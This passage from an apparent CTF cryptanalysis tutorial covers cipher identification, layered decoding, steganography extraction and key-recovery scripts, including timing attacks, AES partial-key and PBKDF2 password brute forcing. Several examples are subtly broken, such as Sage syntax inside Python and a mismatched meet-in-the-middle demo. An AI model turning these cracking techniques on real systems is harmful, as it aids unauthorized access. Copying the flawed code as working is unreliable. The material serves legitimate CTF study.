**Complete Mystery Cipher Analysis Script:**

```python
#!/usr/bin/env python3
"""
Complete mystery cipher analyzer
Combines all analysis techniques
"""

def analyze_mystery_cipher(ciphertext):
    print("="*60)
    print("MYSTERY CIPHER ANALYSIS")
    print("="*60)
    
    # 1. Basic characteristics
    print("\n[1] BASIC CHARACTERISTICS")
    analyze_charset(ciphertext)
    
    # 2. Structural patterns
    print("\n[2] STRUCTURAL PATTERNS")
    structural_analysis(ciphertext)
    
    # 3. Statistical analysis
    print("\n[3] STATISTICAL ANALYSIS")
    ioc = calculate_ioc(ciphertext)
    entropy = calculate_entropy(ciphertext)
    print(f"Index of Coincidence: {ioc:.4f}")
    print(f"Entropy: {entropy:.2f} bits/char")
    
    # 4. Frequency analysis
    print("\n[4] FREQUENCY ANALYSIS")
    frequency_analysis(ciphertext, top_n=10)
    
    # 5. N-gram analysis
    print("\n[5] BIGRAM ANALYSIS")
    ngram_analysis(ciphertext, n=2, top=5)
    
    # 6. Pattern words
    print("\n[6] WORD PATTERNS")
    pattern_words(ciphertext)
    
    # 7. Cipher classification
    print("\n[7] CIPHER CLASSIFICATION")
    classifications = classify_cipher(ciphertext)
    for c in classifications:
        print(f"  - {c}")
    
    # 8. Type inference
    print("\n[8] TYPE INFERENCE")
    infer_cipher_type(ciphertext)
    
    print("\n" + "="*60)
    print("RECOMMENDED NEXT STEPS:")
    print("="*60)
    
    # Provide actionable recommendations
    if ioc > 0.06:
        print("1. Try Caesar/ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'")
        print("2. Try substitution cipher solver (Dcode.fr or CyberChef)")
        print("3. Attempt frequency-based manual substitution")
    elif 0.04 < ioc < 0.06:
        print("1. Try Vigenère decoder with various key lengths")
        print("2. Use Kasiski examination for key length")
        print("3. Check for repeating patterns")
    
    if entropy < 6.0:
        print("4. Try common encodings: Base64, Hex, URL encoding")
        print("5. Check CyberChef Magic operation")
    
    print("6. Manual inspection for visual patterns")
    print("7. If all fails, consider modern crypto or custom encoding")

# Usage:
if __name__ == "__main__":
    # Example ciphertext
    example_cipher = "KHOOR ZRUOG WKH TXLFN EURZQ IRA"
    analyze_mystery_cipher(example_cipher)
```

### Practical CTF Mystery Cipher Workflow

**Step-by-step approach:**

```
1. Quick wins (< 2 minutes):
   - CyberChef Magic operation
   - Common ROT checks (ROT13, ROT47)
   - Base64/Hex decode attempts
   - Reverse string

2. Pattern recognition (2-5 minutes):
   - Visual inspection for symbols/grids
   - Check for image-based encoding
   - Identify character set constraints
   - Look for obvious structure

3. Statistical analysis (5-10 minutes):
   - Calculate IoC
   - Frequency distribution
   - Identify cipher family

4. Targeted attack (10+ minutes):
   - Apply appropriate cipher-specific tools
   - Try variants within cipher family
   - Consider custom implementations

5. Last resort:
   - Brute force with common tools
   - Check for hints in challenge description
   - Consult CTF writeups for similar challenges
```

[Inference] Success in mystery cipher challenges typically depends on recognizing patterns quickly and systematically eliminating cipher types based on statistical properties, though unusual or custom ciphers may not conform to standard analysis techniques.

---

## Combined Techniques

#### Encoding + Encryption (Multiple Layers)

CTF challenges frequently employ multiple encoding and encryption layers to obscure flags. Systematic layer removal requires identifying each transformation and applying inverse operations in reverse order.

##### Layer Identification

Analyze suspect data for encoding signatures:

```bash
echo "SGVsbG8gV29ybGQ=" | file -
echo "SGVsbG8gV29ybGQ=" | xxd
echo "SGVsbG8gV29ybGQ=" | strings
```

Base64 uses alphabet `A-Z`, `a-z`, `0-9`, `+/=`. Hexadecimal uses `0-9`, `a-f`. ROT13 produces readable text rotated 13 positions. UTF-16 displays null bytes between ASCII characters.

Automatic layer detection with CyberChef:

1. Paste suspect data into input field
2. Drag "Detect Encoding" operation into recipe
3. Review suggested transformations

CyberChef identifies base64, hex, rot13, UTF-16, and other common encodings.

##### Multi-Layer Decoding Script

Create script for iterative decoding through unknown layers:

```bash
#!/bin/bash
input="$1"
iteration=0
max_iterations=20

echo "=== Layer Decoding Analysis ==="
echo "Input: $input"
echo ""

for ((i=0; i<max_iterations; i++)); do
  # Try base64 decode
  decoded=$(echo "$input" | base64 -d 2>/dev/null)
  if [ $? -eq 0 ] && [ "$decoded" != "$input" ]; then
    echo "[$i] Base64 decoded:"
    echo "    $decoded"
    input="$decoded"
    continue
  fi

  # Try hex decode
  decoded=$(echo "$input" | xxd -r -p 2>/dev/null)
  if [ $? -eq 0 ] && [ "$decoded" != "$input" ]; then
    echo "[$i] Hex decoded:"
    echo "    $decoded"
    input="$decoded"
    continue
  fi

  # Try ROT13
  decoded=$(echo "$input" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
  if [ "$decoded" != "$input" ]; then
    echo "[$i] ROT13 decoded:"
    echo "    $decoded"
    input="$decoded"
    continue
  fi

  # No further decoding possible
  echo "[$i] Terminal output (no further decoding):"
  echo "    $input"
  break
done
```

Usage:

```bash
./multi_decode.sh "SGVsbG8gV29ybGQ="
```

Output shows each decoding step. Modify script to add additional encoding checks (URL encoding, ASCII, Unicode escape sequences).

##### Encoding Chains in Cryptanalysis

Identify encryption algorithm by analyzing encoded ciphertext:

```bash
ciphertext="YWJjZDEyMzQ="
decoded=$(echo "$ciphertext" | base64 -d | xxd -p)
echo "Hex: $decoded"
```

If hex output shows repeating bytes, likely ECB mode (deterministic encryption). If random distribution, likely CBC or CTR mode.

Length analysis:

```bash
ciphertext="YWJjZDEyMzQ="
decoded=$(echo "$ciphertext" | base64 -d)
echo "Decoded length: ${#decoded} bytes"
```

If length is multiple of 16, likely AES-CBC or AES-ECB. If variable, likely AES-CTR or stream cipher.

##### Base64 Padding Exploitation

Incorrect padding sometimes enables brute-force decoding:

```bash
# Add missing padding
missing_padding="SGVsbG8gV29ybGQ"
padded=$(printf '%-4s' "$missing_padding" | tr ' ' '=')
echo "$padded" | base64 -d
```

[Inference] Some encoders strip trailing `=` characters. CTF challenges may intentionally omit padding to test encoder knowledge.

##### Nested Archive Extraction

Multiple compression layers require sequential extraction:

```bash
file archive.gz  # Identifies gzip
gunzip -c archive.gz > archive.tar
file archive.tar  # Identifies tar
tar -xf archive.tar
ls -la  # Check extracted contents
```

Automated multi-layer extraction:

```bash
#!/bin/bash
file="$1"

while true; do
  filetype=$(file -b "$file" | cut -d' ' -f1-3)
  echo "Processing: $file ($filetype)"

  case "$filetype" in
    "gzip compressed"*)
      gunzip "$file"
      file="${file%.gz}"
      ;;
    "bzip2 compressed"*)
      bunzip2 "$file"
      file="${file%.bz2}"
      ;;
    "XZ compressed"*)
      unxz "$file"
      file="${file%.xz}"
      ;;
    "POSIX tar"*)
      tar -xf "$file"
      break
      ;;
    "Zip archive"*)
      unzip "$file"
      break
      ;;
    *)
      echo "Unknown format: $filetype"
      break
      ;;
  esac
done
```

Usage:

```bash
./extract_nested.sh archive.gz
```

#### Steganography + Cryptography

Steganography hides data within legitimate files (images, audio, documents). Combined with encryption, it provides both concealment and confidentiality. CTF challenges often hide encrypted flags in steganographic containers.

##### Image Steganography Detection

Check for hidden data in images using `strings`:

```bash
strings image.jpg | grep -i flag
strings image.jpg | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'
```

Searches for readable strings or base64-encoded data. Extract binary data:

```bash
xxd image.jpg | tail -50
```

Legitimate images end with specific signatures (JPEG: `FFD9`, PNG: `IEND`). Additional data after these signatures indicates appended payload.

Binwalk detects multiple file types:

```bash
binwalk image.jpg
```

Output identifies embedded files:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             JPEG image data
50000         0xC350          Zip archive data, at least v2.0
```

Extract embedded files:

```bash
binwalk -e image.jpg
```

Creates `_image.jpg.extracted/` directory containing extracted files.

Steghide analysis (image steganography tool):

```bash
steghide info image.jpg
```

Displays hidden file info (filename, size, encrypted). Extract:

```bash
steghide extract -sf image.jpg -p password
```

`-p password` specifies password. Prompts if not provided.

##### LSB Steganography

Least Significant Bit steganography modifies low-order image bits, imperceptible to human vision. Extract LSBs:

```bash
python3 << 'EOF'
from PIL import Image
import sys

img = Image.open('image.png')
pixels = img.load()
width, height = img.size

lsb_data = []
for y in range(height):
    for x in range(width):
        pixel = pixels[x, y]
        if isinstance(pixel, tuple):
            lsb_data.append(pixel[0] & 1)
        else:
            lsb_data.append(pixel & 1)

# Convert bits to bytes
result = ''.join(str(bit) for bit in lsb_data)
print("Raw bit string (first 100 bits):", result[:100])

# Convert to hex
hex_output = hex(int(result, 2))[2:]
print("Hex output:", hex_output[:100])

# Convert to ASCII
ascii_output = ''
for i in range(0, len(result), 8):
    byte = result[i:i+8]
    if len(byte) == 8:
        ascii_output += chr(int(byte, 2))

print("ASCII output:", ascii_output[:100])
EOF
```

##### Audio Steganography

Extract hidden data from audio files:

```bash
strings audio.wav | grep -i flag
```

Low-frequency audio may hide data undetectable to human hearing. Use spectral analysis:

```bash
sox audio.wav -n spectrogram
```

Creates visual representation. Unusual patterns indicate hidden data.

SoX extraction (requires knowledge of encoding):

```bash
sox audio.wav -c 1 -r 8000 -b 8 audio_raw.wav
strings audio_raw.wav
```

Reduce sample rate and bit depth, then extract strings.

##### PDF Steganography

Extract metadata and embedded files from PDFs:

```bash
pdfinfo document.pdf
pdftk document.pdf dump_data
```

`pdfinfo` shows metadata (author, creator, production date). `pdftk dump_data` extracts structure details.

Embedded file extraction:

```bash
pdftk document.pdf unpack_files output extracted/
```

Searches for embedded objects (images, executables, documents).

String extraction from PDF:

```bash
pdftotext document.pdf -
strings document.pdf | grep -i flag
```

`pdftotext` converts PDF text to plaintext. `strings` extracts any embedded text.

##### Encrypted Steganographic Payload

Workflow combining steganography and encryption:

```bash
# 1. Encrypt flag with AES
echo "FLAG{secret}" > flag.txt
openssl enc -aes-256-cbc -in flag.txt -out flag.enc -S $(openssl rand -hex 8) -md sha256

# 2. Hide encrypted flag in image using steghide
steghide embed -cf image.jpg -ef flag.enc -p "password" -sf stego.jpg

# 3. Extract and decrypt
steghide extract -sf stego.jpg -p "password" -xf recovered.enc
openssl enc -aes-256-cbc -d -in recovered.enc -md sha256
```

Challenge verification:

```bash
cmp flag.txt <(openssl enc -aes-256-cbc -d -in recovered.enc -md sha256)
echo $?  # 0 if identical
```

##### Metadata Watermarking

Watermarks in image metadata:

```bash
identify -verbose image.jpg | grep -A 5 "Properties"
exiftool image.jpg
```

`identify` (ImageMagick) and `exiftool` display metadata. Look for unusual properties, comments, or EXIF data containing encoded information.

Modify metadata:

```bash
exiftool -Comment="FLAG{watermark}" image.jpg
```

Read modified metadata:

```bash
exiftool -Comment image.jpg
```

#### Custom Cipher Variants

CTF challenges often feature custom or modified ciphers combining standard algorithms with non-standard operations. Understanding implementation details is critical for cryptanalysis.

##### Substitution Cipher Analysis

Identify substitution ciphers (character mapping without positional information):

```bash
ciphertext="KHOOR ZRUOG"
```

Frequency analysis reveals substitution mapping:

```bash
python3 << 'EOF'
from collections import Counter

ciphertext = "KHOOR ZRUOG"
letters = [c for c in ciphertext if c.isalpha()]

freq = Counter(letters)
print("Letter frequency:")
for letter, count in freq.most_common():
    print(f"  {letter}: {count}")

# Brute-force ROT (Caesar cipher)
for shift in range(26):
    decrypted = ''.join(
        chr((ord(c) - ord('A') - shift) % 26 + ord('A')) if c.isupper()
        else chr((ord(c) - ord('a') - shift) % 26 + ord('a')) if c.islower()
        else c
        for c in ciphertext
    )
    print(f"ROT{shift}: {decrypted}")
EOF
```

Output:

```
ROT0: KHOOR ZRUOG
ROT1: JGNNQ YQTNF
...
ROT3: HELLO WORLD
```

##### Polyalphabetic Cipher Cryptanalysis

Vigenère cipher uses repeating key for character shifting:

```bash
python3 << 'EOF'
def vigenere_decrypt(ciphertext, key):
    result = []
    key_index = 0
    for char in ciphertext:
        if char.isupper():
            shift = ord(key[key_index % len(key)].upper()) - ord('A')
            result.append(chr((ord(char) - ord('A') - shift) % 26 + ord('A')))
            key_index += 1
        elif char.islower():
            shift = ord(key[key_index % len(key)].lower()) - ord('a')
            result.append(chr((ord(char) - ord('a') - shift) % 26 + ord('a')))
            key_index += 1
        else:
            result.append(char)
    return ''.join(result)

ciphertext = "LXFOPVEFRNHR"
# Try common English words as keys
common_keys = ["PASSWORD", "SECRET", "KEY", "FLAG"]
for key in common_keys:
    decrypted = vigenere_decrypt(ciphertext, key)
    print(f"Key: {key} -> {decrypted}")
EOF
```

[Inference] Vigenère cipher keyspace depends on key length. Known-plaintext attacks (if partial plaintext available) reveal key characters. Kasiski examination (finding repeated sequences) estimates key length.

##### XOR Cipher Variants

Single-byte XOR brute force:

```bash
python3 << 'EOF'
import sys

ciphertext = bytes.fromhex("1a0a1a0c1a020f10")

for key in range(256):
    decrypted = bytes(byte ^ key for byte in ciphertext)
    try:
        text = decrypted.decode('ascii')
        if all(c.isprintable() for c in text):
            print(f"Key: {key:02x} -> {text}")
    except:
        pass
EOF
```

Multi-byte XOR (repeating key):

```bash
python3 << 'EOF'
def xor_decrypt(ciphertext, key):
    return bytes(ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext)))

ciphertext = bytes.fromhex("1a0a1a0c1a020f10")
key = b"SECRET"

decrypted = xor_decrypt(ciphertext, key)
print(decrypted.decode('utf-8', errors='ignore'))
EOF
```

Known-plaintext attack (if plaintext fragment known):

```bash
python3 << 'EOF'
def recover_xor_key(ciphertext, known_plaintext):
    key = bytes(c ^ p for c, p in zip(ciphertext[:len(known_plaintext)], known_plaintext))
    return key

ciphertext = bytes.fromhex("1a0a1a0c1a020f10")
known_plaintext = b"FLAG{"

key = recover_xor_key(ciphertext, known_plaintext)
print(f"Recovered key: {key.hex()}")

# Decrypt full message with recovered key
decrypted = bytes(ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext)))
print(f"Decrypted: {decrypted.decode('utf-8', errors='ignore')}")
EOF
```

##### Custom Block Cipher Implementation

Analyze custom cipher by identifying block structure:

```bash
python3 << 'EOF'
ciphertext_hex = "0102030405060708090a0b0c0d0e0f10" * 2

# Split into equal chunks
block_size = 16
blocks = [ciphertext_hex[i:i+block_size] for i in range(0, len(ciphertext_hex), block_size)]

print("Block analysis:")
for i, block in enumerate(blocks):
    print(f"Block {i}: {block}")
    
# Check for ECB mode (identical plaintexts produce identical ciphertexts)
if blocks[0] == blocks[1]:
    print("ECB mode detected (identical blocks)")
else:
    print("CBC, CTR, or other mode (different blocks)")
EOF
```

If identical plaintext blocks produce identical ciphertext blocks, ECB mode is used (insecure). Exploit by identifying pattern repetitions.

##### Feistel Network Custom Variants

Analyze custom Feistel-like ciphers by examining round structure:

```bash
python3 << 'EOF'
# Simplified custom Feistel analysis
def custom_feistel_analyze(ciphertext_blocks):
    """
    Feistel networks swap left/right halves each round.
    If you can recover one round, patterns emerge.
    """
    for block_index, block in enumerate(ciphertext_blocks):
        left = block[:len(block)//2]
        right = block[len(block)//2:]
        print(f"Block {block_index}:")
        print(f"  Left:  {left.hex()}")
        print(f"  Right: {right.hex()}")

ciphertext = bytes.fromhex("0102030405060708090a0b0c0d0e0f101112131415161718")
blocks = [ciphertext[i:i+8] for i in range(0, len(ciphertext), 8)]
custom_feistel_analyze(blocks)
EOF
```

Recover round keys through differential cryptanalysis (comparing plaintext/ciphertext pairs with slight differences) if round structure is weak.

##### Truncated Hash Function

Some CTF ciphers use truncated hashes for key derivation. Test truncation vulnerability:

```bash
python3 << 'EOF'
import hashlib

# Assume cipher uses first 8 bytes of SHA256
password = "PASSWORD"
full_hash = hashlib.sha256(password.encode()).digest()
truncated_key = full_hash[:8]

print(f"Full hash:      {full_hash.hex()}")
print(f"Truncated key:  {truncated_key.hex()}")

# If truncation is known, attempt to find other passwords with same truncated hash
# This is a birthday problem variant
EOF
```

[Unverified] Finding hash collisions on truncated functions is computationally expensive. This is typically not exploitable within CTF timeframes unless the truncation is extremely aggressive (e.g., 1-2 bytes).

##### Custom IV/Nonce Generation

Identify weaknesses in initialization vector generation:

```bash
python3 << 'EOF'
# Collect multiple ciphertexts and analyze IVs
import struct

ciphertexts = [
    "0102030405060708090a0b0c0d0e0f10aaaabbbbccccdddd",
    "0102030405060709090a0b0c0d0e0f11bbbbccccddddeeee",
    "010203040506070a090a0b0c0d0e0f12ccccddddeeeefffff",
]

# If IVs are sequential or time-based, they're predictable
for i, ct in enumerate(ciphertexts):
    iv = ct[:16]
    ciphertext = ct[16:]
    print(f"Message {i}: IV={iv}, CT={ciphertext}")

# Check for patterns
ivs_int = [int(ct[:16], 16) for ct in ciphertexts]
diffs = [ivs_int[i+1] - ivs_int[i] for i in range(len(ivs_int)-1)]
print(f"IV differences: {diffs}")
if len(set(diffs)) == 1:
    print("Sequential IV detected (predictable)")
EOF
```

Predictable IVs enable known-plaintext attacks in CBC mode. If plaintext for one message is known, decryption of others becomes possible.

##### Meet-in-the-Middle Attack

Against custom double-encryption (encrypt plaintext twice with different keys):

```bash
python3 << 'EOF'
# Double encryption: C = E(K2, E(K1, P))
# Meet-in-the-middle: precompute intermediate values

def simple_cipher(plaintext, key):
    """Placeholder for custom cipher"""
    return bytes(p ^ k for p, k in zip(plaintext, (key * len(plaintext))[:len(plaintext)]))

plaintext = b"HELLO"
key1 = b"KEY1"
key2 = b"KEY2"

# Meet-in-the-middle attack
intermediate = simple_cipher(plaintext, key1)
ciphertext = simple_cipher(intermediate, key2)

# Brute force: Try all possible K1, store results
mitm_table = {}
for k1_attempt in range(256):
    key1_attempt = bytes([k1_attempt])
    intermediate_attempt = simple_cipher(plaintext, key1_attempt)
    mitm_table[intermediate_attempt] = k1_attempt

# Try all possible K2, check if intermediate matches
for k2_attempt in range(256):
    key2_attempt = bytes([k2_attempt])
    # Reverse second encryption
    intermediate_recovered = bytes(c ^ k2_attempt for c in ciphertext)
    if intermediate_recovered in mitm_table:
        print(f"Keys found: K1={mitm_table[intermediate_recovered]}, K2={k2_attempt}")
EOF
```

Meet-in-the-middle reduces 2^n × 2^n keyspace search to 2^n + 2^n, making double encryption vulnerable to 2-key attacks.

##### Weak S-Box Vulnerability

Custom ciphers using weak substitution boxes (S-boxes) enable algebraic cryptanalysis:

```bash
python3 << 'EOF'
# Example: Linear S-box (output = input * constant mod 256)
# This is cryptographically weak

def weak_sbox(input_byte):
    return (input_byte * 3) % 256

# Test for linearity
sbox_output = [weak_sbox(i) for i in range(256)]

# Check if output XOR(a, b) == XOR(sbox(a), sbox(b))
linear = True
for a in range(256):
    for b in range(256):
        if weak_sbox(a ^ b) != (sbox_output[a] ^ sbox_output[b]):
            linear = False
            break
    if not linear:
        break

if linear:
    print("S-box is linear (cryptographically weak)")
else:
    print("S-box shows non-linear properties")
EOF
```

[Inference] Linear S-boxes fail to provide diffusion (changes in input should affect multiple output bits). This enables algebraic attacks and reduces effective key entropy.

Related Topics: Differential Cryptanalysis (analyzing plaintext-ciphertext differences), Linear Cryptanalysis (exploiting linear approximations), Timing Attack (exploiting implementation timing variations), Power Analysis (exploiting power consumption patterns during encryption).

---

## Key Recovery Challenges

### Partial Key Information

Partial key recovery scenarios provide fragments of cryptographic keys through various channels, requiring techniques to reconstruct the complete key from available information.

#### Known Key Bits/Bytes

**Scenario: RSA with Partial Private Key**

python

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, GCD

def recover_rsa_from_partial_d(n, e, partial_d, known_bits):
    """
    Recover RSA private key when some bits of d are known
    Uses Coppersmith's method or lattice reduction
    """
    # Example: known lower bits of d
    # d = d_high * 2^known_bits + d_low (known)
    
    # [Inference] This approach works best when approximately half the bits are known
    from sage.all import *
    
    # Convert to Sage integers
    n_sage = Integer(n)
    e_sage = Integer(e)
    d_low = Integer(partial_d)
    
    # Build polynomial
    P.<x> = PolynomialRing(Zmod(n_sage))
    f = e_sage * (x * 2^known_bits + d_low) - 1
    
    # Coppersmith attack
    d_high = f.small_roots(X=2^(n.bit_length() - known_bits), beta=0.5)
    
    if d_high:
        d = int(d_high[0]) * (2^known_bits) + partial_d
        return d
    
    return None

# Example usage
n = 0x00d0f4e4cf68c55976e7c2419f3e6c1be7c8f3e4d5a6b7c8d9e0f1a2b3c4d5e6f7
e = 65537
partial_d_low = 0x1234567890abcdef  # Known lower 64 bits
known_bits = 64

# [Unverified] Recovery success depends on number of known bits
# d = recover_rsa_from_partial_d(n, e, partial_d_low, known_bits)
```

**Scenario: AES with Partial Key Bytes**

python

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import itertools

def recover_aes_partial_key(ciphertext, known_plaintext, partial_key, unknown_positions):
    """
    Brute force unknown bytes in AES key
    
    Args:
        ciphertext: encrypted data
        known_plaintext: known plaintext (for verification)
        partial_key: key with some bytes known (use None for unknown)
        unknown_positions: list of indices with unknown bytes
    """
    key_length = len(partial_key)
    num_unknown = len(unknown_positions)
    
    print(f"[*] Brute forcing {num_unknown} unknown key bytes ({2**(8*num_unknown)} combinations)")
    
    # Generate all possible values for unknown bytes
    for candidate_bytes in itertools.product(range(256), repeat=num_unknown):
        # Build test key
        test_key = bytearray(partial_key)
        for i, pos in enumerate(unknown_positions):
            test_key[pos] = candidate_bytes[i]
        
        try:
            cipher = AES.new(bytes(test_key), AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext)
            
            # Verify against known plaintext
            if plaintext[:len(known_plaintext)] == known_plaintext:
                print(f"[+] Key found: {test_key.hex()}")
                return bytes(test_key)
        except:
            continue
    
    return None

# Example: 14 of 16 bytes known
partial_key = bytearray(b'secretkey1234' + b'\x00\x00')  # Last 2 bytes unknown
unknown_positions = [14, 15]
ciphertext = bytes.fromhex('...')  # Challenge ciphertext
known_plaintext = b'flag{'

# key = recover_aes_partial_key(ciphertext, known_plaintext, partial_key, unknown_positions)
```

**Scenario: XOR Key with Known Prefix/Suffix**

python

```python
def recover_xor_key_partial(ciphertext, plaintext_fragment, fragment_offset):
    """
    Recover XOR key when part of plaintext is known
    
    Args:
        ciphertext: full ciphertext
        plaintext_fragment: known plaintext segment
        fragment_offset: position of known plaintext in message
    """
    # Extract key bytes from known plaintext section
    key_fragment = bytes([c ^ p for c, p in zip(
        ciphertext[fragment_offset:fragment_offset + len(plaintext_fragment)],
        plaintext_fragment
    )])
    
    print(f"[+] Recovered key fragment: {key_fragment.hex()}")
    
    # If key is repeating, determine key length
    # Try different key lengths
    for key_len in range(len(key_fragment), len(ciphertext)):
        if key_len % len(key_fragment) == 0:
            # Extend key by repetition
            full_key = (key_fragment * (key_len // len(key_fragment) + 1))[:key_len]
            
            # Decrypt and check for readable text
            plaintext = bytes([c ^ k for c, k in zip(ciphertext, full_key)])
            
            # Simple heuristic: check for printable characters
            if all(32 <= b < 127 or b in [9, 10, 13] for b in plaintext):
                print(f"[+] Possible key length: {key_len}")
                print(f"[+] Full key: {full_key[:key_len].hex()}")
                print(f"[+] Plaintext: {plaintext.decode('ascii', errors='ignore')}")
                return full_key[:key_len]
    
    return None

# Example
ciphertext = bytes.fromhex('1c0e1f0a1b5c0e1f0a...')
known_text = b'CTF{'  # Flags often start with this
offset = 0

# key = recover_xor_key_partial(ciphertext, known_text, offset)
```

#### Leaked Key Material from Side Channels

**Scenario: Timing Attack Key Recovery**

python

```python
import time
import statistics

def timing_based_key_recovery(oracle_function, key_space):
    """
    Recover key by analyzing timing differences in oracle responses
    
    Args:
        oracle_function: function that validates key (returns True/False)
        key_space: possible key values to test
    """
    timing_data = {}
    
    for candidate_key in key_space:
        timings = []
        
        # Multiple measurements for statistical significance
        for _ in range(100):
            start = time.perf_counter()
            result = oracle_function(candidate_key)
            end = time.perf_counter()
            timings.append(end - start)
        
        avg_time = statistics.mean(timings)
        std_dev = statistics.stdev(timings)
        
        timing_data[candidate_key] = {
            'avg': avg_time,
            'std': std_dev,
            'result': result
        }
    
    # [Inference] Correct key typically shows different timing pattern
    # Sort by timing (slower often means more processing = partial match)
    sorted_keys = sorted(timing_data.items(), key=lambda x: x[1]['avg'], reverse=True)
    
    print("[*] Top timing candidates:")
    for key, data in sorted_keys[:5]:
        print(f"  Key: {key}, Avg: {data['avg']:.6f}s, StdDev: {data['std']:.6f}s")
    
    return sorted_keys[0][0]

# Example: Byte-by-byte timing attack on PIN
def pin_oracle(pin):
    """Simulated oracle with timing leak"""
    correct_pin = "1234"
    time.sleep(0.001)  # Base delay
    
    for i, digit in enumerate(pin):
        if i >= len(correct_pin):
            return False
        if digit != correct_pin[i]:
            return False
        time.sleep(0.0001)  # Extra delay for each correct digit
    
    return True

# Byte-by-byte recovery
def recover_pin_bytewise(length=4):
    recovered = ""
    
    for position in range(length):
        best_digit = None
        best_time = 0
        
        for digit in '0123456789':
            test_pin = recovered + digit + '0' * (length - position - 1)
            
            timings = []
            for _ in range(50):
                start = time.perf_counter()
                pin_oracle(test_pin)
                end = time.perf_counter()
                timings.append(end - start)
            
            avg_time = statistics.mean(timings)
            
            if avg_time > best_time:
                best_time = avg_time
                best_digit = digit
        
        recovered += best_digit
        print(f"[+] Position {position}: {best_digit} (time: {best_time:.6f}s)")
    
    return recovered

# pin = recover_pin_bytewise()
```

**Scenario: Power Analysis Side Channel**

python

```python
import numpy as np

def simulated_power_trace(key_byte, plaintext_byte):
    """
    [Inference] Simulate power consumption during AES S-box lookup
    Real traces require hardware measurement equipment
    """
    # AES S-box (first row for demonstration)
    sbox = [
        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
        0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76
    ]
    
    # Intermediate value
    intermediate = plaintext_byte ^ key_byte
    sbox_output = sbox[intermediate % 16]  # Simplified
    
    # Power consumption proportional to Hamming weight
    hamming_weight = bin(sbox_output).count('1')
    
    # Add noise
    noise = np.random.normal(0, 0.5)
    power = hamming_weight + noise
    
    return power

def differential_power_analysis(power_traces, plaintexts, byte_position):
    """
    Recover key byte using DPA
    
    Args:
        power_traces: list of power consumption measurements
        plaintexts: corresponding plaintext values
        byte_position: which key byte to recover (0-15)
    """
    best_key_candidate = None
    best_correlation = 0
    
    for key_guess in range(256):
        # Hypothetical power consumption for this key guess
        hypothetical_power = []
        
        for plaintext in plaintexts:
            pt_byte = plaintext[byte_position]
            power = simulated_power_trace(key_guess, pt_byte)
            hypothetical_power.append(power)
        
        # Calculate correlation with actual traces
        correlation = np.corrcoef(hypothetical_power, power_traces)[0, 1]
        
        if abs(correlation) > abs(best_correlation):
            best_correlation = correlation
            best_key_candidate = key_guess
    
    print(f"[+] Key byte {byte_position}: 0x{best_key_candidate:02x} (correlation: {best_correlation:.4f})")
    return best_key_candidate

# Example usage (simulated)
num_traces = 1000
plaintexts = [bytes([np.random.randint(0, 256) for _ in range(16)]) for _ in range(num_traces)]
# [Unverified] Real power traces would come from oscilloscope measurements
# power_traces = [measure_power(pt) for pt in plaintexts]
```

#### Key Derivation Information Leaks

**Scenario: Weak Key Derivation Function**

python

```python
import hashlib
import itertools

def recover_pbkdf2_weak_params(hash_output, salt, known_password_chars, min_length, max_length, iterations):
    """
    Recover password when PBKDF2 parameters are weak
    
    Args:
        hash_output: target PBKDF2 output
        salt: known salt value
        known_password_chars: character set used in password
        min_length, max_length: password length bounds
        iterations: PBKDF2 iteration count
    """
    from Crypto.Protocol.KDF import PBKDF2
    
    print(f"[*] Testing passwords length {min_length}-{max_length}")
    print(f"[*] Character set: {known_password_chars}")
    
    for length in range(min_length, max_length + 1):
        for password_tuple in itertools.product(known_password_chars, repeat=length):
            password = ''.join(password_tuple).encode()
            
            derived_key = PBKDF2(password, salt, dkLen=len(hash_output), count=iterations)
            
            if derived_key == hash_output:
                print(f"[+] Password found: {password.decode()}")
                return password.decode()
    
    return None

# Example: weak iteration count and short password
salt = b'ctf_salt_2024'
target_hash = bytes.fromhex('...')
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'

# [Inference] Success depends on password complexity and iteration count
# password = recover_pbkdf2_weak_params(target_hash, salt, charset, 4, 6, 1000)
```

**Scenario: Deterministic Key Generation**

python

```python
import hashlib

def recover_deterministic_key(known_seed_partial, seed_length, ciphertext, known_plaintext):
    """
    Recover key when generated from predictable seed (e.g., timestamp, counter)
    
    Args:
        known_seed_partial: known part of seed (e.g., date without time)
        seed_length: total seed length
        ciphertext: encrypted data
        known_plaintext: known plaintext fragment
    """
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    
    # Example: seed is timestamp within known range
    # Seed format: YYYYMMDD_HHMMSS
    date_part = known_seed_partial  # e.g., "20240115_"
    
    for hour in range(24):
        for minute in range(60):
            for second in range(60):
                seed = f"{date_part}{hour:02d}{minute:02d}{second:02d}"
                
                # Generate key from seed
                key = SHA256.new(seed.encode()).digest()[:16]  # AES-128
                
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    plaintext = cipher.decrypt(ciphertext[:16])
                    
                    if plaintext[:len(known_plaintext)] == known_plaintext:
                        print(f"[+] Seed found: {seed}")
                        print(f"[+] Key: {key.hex()}")
                        return key
                except:
                    continue
    
    return None

# Example usage
known_date = "20240115_"  # Know date, not time
ciphertext = bytes.fromhex('...')
known_start = b'flag{'

# key = recover_deterministic_key(known_date, 16, ciphertext, known_start)
```

### Brute-Force Keyspace Reduction

Techniques to reduce cryptographic keyspace from infeasible to practical brute-force ranges.

#### Entropy Analysis

**Scenario: Low-Entropy Key Detection**

python

```python
import math
from collections import Counter

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    
    entropy = 0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def analyze_key_entropy(key_samples):
    """
    Analyze entropy of key generation to identify weaknesses
    
    Args:
        key_samples: list of generated keys to analyze
    """
    print("[*] Analyzing key entropy...")
    
    # Positional entropy (each byte position)
    key_length = len(key_samples[0])
    positional_entropy = []
    
    for pos in range(key_length):
